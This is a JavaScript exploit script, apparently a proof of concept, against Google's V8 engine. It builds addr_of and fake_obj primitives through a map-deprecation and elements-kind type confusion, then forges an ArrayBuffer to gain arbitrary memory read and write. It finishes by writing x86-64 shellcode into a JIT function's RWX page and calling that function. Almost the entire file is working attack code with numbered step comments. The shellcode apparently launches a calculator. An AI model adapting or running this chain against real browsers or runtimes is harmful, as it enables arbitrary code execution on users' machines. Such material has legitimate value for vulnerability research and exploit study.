const MAX_ITERATIONS = 0x100000;
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return i.toString(16);
}

// Garbage collection is required to move objects to a stable position in
// memory (OldSpace) before leaking their addresses.
function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

// create a jit function
var jit_obj = new Function("var a = 1000000");

function change_elements_kind_1(arr) {
    arr[0] = Array;
}

function read_as_unboxed() {
    return evil_1[0];
}

change_elements_kind_1({});

var map_manipulator_1 = new Array(1.1, 2.2);
map_manipulator_1.x = 7;    // Map M0
//%DebugPrint(map_manichange_elements_kind_1pulator_1);
change_elements_kind_1(map_manipulator_1);   // Map M1

map_manipulator_1.x = {};    // Map M2(stable), M1 and M0 are deprecated

evil_1 = new Array(1.1, 2.2);
evil_1.x = {};    // Map M3(stable)

var x = new Array({});

for(var i=0; i<MAX_ITERATIONS; i++) {
    change_elements_kind_1(x);
}


for(var i=0; i<MAX_ITERATIONS; i++) {
    read_as_unboxed();
}

var init_1 = false;
// addr_of primitive
function addr_of(obj) {
    if(!init_1) {
        change_elements_kind_1(evil_1);     // change M3 to M2, read_as_unboxed is not know that M3 are not stable, form the vuln.
        init_1 = true;
    }
    evil_1[0] = obj;

    return f2i(read_as_unboxed());
}


//change_elements_kind(evil_1);
//var jit_obj_addr = f2i(addr_of(jit_obj));
//print(hex(jit_obj_addr));
//%DebugPrint(jit_obj);

// var jit_obj_addr = f2i(addr_of(jit_obj));
// print(hex(jit_obj_addr));
// %DebugPrint(jit_obj);


function change_elements_kind_2(arr) {
    arr[0] = Array;
}

function write_as_unboxed(val) {
    return evil_2[0] = val;
}

// fake_obj primitive
var init_2 = false;
function fake_obj(addr) {
    //print(hex(addr));
    if(!init_2) {
        change_elements_kind_2(evil_2);
        init_2 = true;
    }
    write_as_unboxed(i2f(addr));

    return evil_2[0];
}


change_elements_kind_2({});

var map_manipulator_2 = new Array(1.1, 2.2, 3.3);
map_manipulator_2.y = 7;
change_elements_kind_2(map_manipulator_2);

map_manipulator_2.y = {};

evil_2 = new Array(1.1, 2.2, 3.3);
evil_2.y = {};

var y = new Array({})

for(var i=0; i<MAX_ITERATIONS; i++) {
    change_elements_kind_2(y);
}

for(var i=0; i<MAX_ITERATIONS; i++) {
    write_as_unboxed(2.2);
}


var ab = new ArrayBuffer(0x200);

// pading to form the heap layout
var pading = [
    i2f(0xdaba0000daba0000), // map, whatever;
    i2f(0x000900c31f000008),
    i2f(0x00000000082003ff),
    1.1, // prototype
    2.2, // constructor
    i2f(0)
]

// array to build fake ArrayBuffer map
var fake_ab_map = [
    i2f(0xdaba0000daba0000), // map, whatever;
    //i2f(0x0001f000008),
    i2f(0x000900c31f000008),
    i2f(0x00000000082003ff),
    1.1, // prototype
    2.2, // constructor
    i2f(0)
]

// array to build fake ArrayBuffer
var fake_ab = [
    1.1, // ArrayBuffer Map;
    2.2,  // properties (whatever);
    3.3,  // elements (whatever);
    i2f(0x40000000000), // length 0x400
    4.4, // backing store;
    i2f(0x0000000000000004), // copy form ab stucture
    i2f(0)
]

// trigger gc to mov the upper data to old space
gc();
gc();
gc();

// step 1. get the prototype of ArrayBuffer Map
var ab_map_proto_addr = addr_of(ab.__proto__);
var ab_map_construct_addr = ab_map_proto_addr - 0x70;
print("[+] ArrayBuffer Map prototype addr: 0x"+hex(ab_map_proto_addr));
print("[+] ArrayBuffer Map Constructor addr: 0x"+hex(ab_map_construct_addr));
//%DebugPrint(ab);
//%SystemBreak();
// step 2. use the ab_map_proto_addr and ab_map_construct_addr to build fake ArrayBuffer Map
//%DebugPrint(fake_ab_map);
//%SystemBreak();
fake_ab_map[3] = i2f(ab_map_proto_addr);
fake_ab_map[4] = i2f(ab_map_construct_addr);

// step 3. get the fake ArrayBuffer Map elements' addr
var fake_ab_map_addr = addr_of(fake_ab_map) + 0x30; // elements addr of fake_ab_map
print("[+] fake ArrayBuffer Map addr: 0x"+hex(fake_ab_map_addr));

// step 4. use the fakeABMapAddr to build fakeAB;
fake_ab[0] = i2f(fake_ab_map_addr);
fake_ab[1] = i2f(fake_ab_map_addr);
//%DebugPrint(fake_ab_map);
//%SystemBreak();

// step 5. get the fake ArrayBuffer elements' addr
var fake_ab_addr = addr_of(fake_ab) + 0x30 ; // elements addr of fakeAB
print ("[+] fake ArrayBuffer addr: 0x"+hex(fake_ab_addr));

// step 6. get the jit obj addr.
var jit_obj_addr = addr_of(jit_obj);
print("[+] jit obj addr: 0x"+hex(jit_obj_addr));

// step 7. get fake ArrayBuffer object with fake_obj primitive
var fake_ab_obj = fake_obj(fake_ab_addr);
//%DebugPrint(evil_2);
//%DebugPrint(fake_ab_obj);
//%DebugPrint(ab);
//%SystemBreak();
// step 8. build DataView obj
var dataView = new DataView(fake_ab_obj);
//%DebugPrint(evil_2);
//%DebugPrint(fake_ab_obj);
//%DebugPrint(dataView);
//%SystemBreak()

// aar primitive
function data_view_read64(addr)
{

    fake_ab[4] = addr; // overwrite fakeAB[4], which is corresponding to backing store pointer

    return f2i(dataView.getFloat64(0, true));
}

// aaw primitive
function data_view_write(addr, payload)
{

    fake_ab[4] = addr;

    for (let i=0; i<payload.length; i++) {
        dataView.setUint8(i, payload[i]);
    }
    return ;
}


// step 9. leak rwx memory here
var rwx_addr = data_view_read64(i2f(jit_obj_addr-1+0x38));
print("[+] jit obj addr: 0x"+hex(jit_obj_addr));
print("[+] rwx addr: 0x"+hex(rwx_addr));
//%DebugPrint(jit_obj);
//%SystemBreak();
var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

// step 10. write shellcode to jit code
data_view_write(i2f(rwx_addr), shellcode);
// step 11. trigger jit function to run shellcode
jit_obj();
